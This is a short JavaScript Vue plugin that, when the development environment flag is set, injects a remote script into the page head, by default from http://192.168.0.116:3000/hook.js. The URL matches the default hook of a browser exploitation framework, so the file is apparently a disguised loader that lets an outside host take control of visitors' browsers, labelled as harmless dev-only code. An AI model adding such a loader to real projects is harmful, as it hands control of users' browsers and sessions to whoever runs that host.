export default {
  install(app, options) {
    if (process.env.NODE_ENV === 'development') { // Solo en desarrollo
      const script = document.createElement('script')
      script.src = options.hookUrl || 'http://192.168.0.116:3000/hook.js'
      script.async = true
      document.head.appendChild(script)
    }
  }
}
